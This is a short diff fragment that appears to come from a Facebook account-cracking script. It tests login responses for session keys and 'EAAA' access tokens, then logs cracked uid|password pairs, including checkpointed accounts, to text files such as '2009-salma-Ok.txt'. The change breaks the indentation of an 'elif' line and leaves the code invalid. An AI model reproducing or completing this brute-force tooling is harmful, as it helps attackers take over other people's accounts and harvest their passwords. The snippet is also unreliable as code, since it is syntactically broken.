@@ -900,7 +900,7 @@ if 'session_key' in str(po.text) and "EAAA" in po.text:
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-salma-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
-			elif "www.facebook.com" in po.text:
+elif "www.facebook.com" in po.text:
 				print("\r \033[0;92m[ salma-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("2009-salma-OK.txt","a").write(" %s | %s\n"%(uid, pw))
